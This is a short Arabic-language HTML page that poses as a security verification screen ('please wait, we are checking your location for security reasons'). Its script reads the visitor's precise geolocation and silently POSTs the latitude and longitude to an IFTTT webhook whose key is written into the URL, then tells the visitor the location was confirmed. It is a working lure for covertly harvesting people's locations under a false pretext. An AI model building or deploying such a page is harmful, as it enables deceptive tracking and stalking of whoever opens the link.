
<!DOCTYPE html>
<html>
<head>
  <title>جارٍ التحقق...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
  <h2>يرجى الانتظار...</h2>
  <p>نقوم بالتحقق من موقعك لأسباب أمنية...</p>

  <script>
    navigator.geolocation.getCurrentPosition(function(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;

      // إرسال الموقع إلى IFTTT Webhook
      fetch('https://maker.ifttt.com/trigger/send_location/with/key/oC_hS_33eGiuAVNSX6IgZ', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ value1: latitude, value2: longitude })
      });

      document.body.innerHTML += `<p>تم تحديد موقعك بنجاح.</p>`;
    }, function(error) {
      document.body.innerHTML += `<p>فشل في تحديد الموقع أو تم الرفض.</p>`;
    });
  </script>
</body>
</html>
